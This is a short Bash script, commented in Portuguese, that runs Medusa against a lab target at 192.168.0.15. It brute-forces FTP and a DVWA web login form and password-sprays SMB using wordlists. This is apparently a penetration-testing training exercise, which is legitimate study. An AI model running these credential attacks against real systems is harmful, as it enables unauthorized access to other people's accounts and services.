#!/bin/bash

# IP de exemplo do alvo no laboratório
TARGET="192.168.0.15"

echo "===== INÍCIO DOS TESTES MEDUSA ====="

echo "[+] Testando brute force FTP..."
medusa -h $TARGET -u msfadmin -P wordlists/ftp-pass.txt -M ftp

echo "[+] Testando brute force DVWA..."
medusa -h $TARGET -u admin -P wordlists/dvwa.txt -M http \
  -m DIR:/DVWA/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY:Login failed

echo "[+] Testando Password Spraying SMB..."
medusa -h $TARGET -U wordlists/users.txt -p Password123 -M smbnt

echo "===== FINALIZADO ====="
